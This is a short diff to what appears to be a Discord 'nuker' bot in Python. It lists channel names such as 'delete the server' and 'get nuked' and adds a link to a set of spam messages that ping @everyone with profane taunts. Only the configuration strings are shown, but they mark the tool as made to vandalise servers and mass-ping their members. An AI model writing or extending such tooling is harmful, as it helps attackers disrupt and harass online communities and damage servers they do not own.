@@ -6,7 +6,7 @@ import os
 
 CHANNEL_NAMES = ["get nuked", "delete the server", "get fucked", "trash server"]
  
-MESSAGE_CONTENTS = ["@everyone Get Fucking Nuked :clown:","@everyone Get Nuked :crab: https://images.immediate.co.uk/production/volatile/sites/7/2018/11/GettyImages-107808064-6eb5e54.jpg?quality=45&resize=620,413", "@everyone Delete the Server"]
+MESSAGE_CONTENTS = ["https://media.discordapp.net/attachments/634674676374962197/685781230679228430/no.gif @everyone","@everyone Get Fucking Nuked :clown:","@everyone Get Nuked :crab: https://images.immediate.co.uk/production/volatile/sites/7/2018/11/GettyImages-107808064-6eb5e54.jpg?quality=45&resize=620,413", "@everyone Delete the Server"]
 
 bot = commands.Bot(command_prefix='[')
 
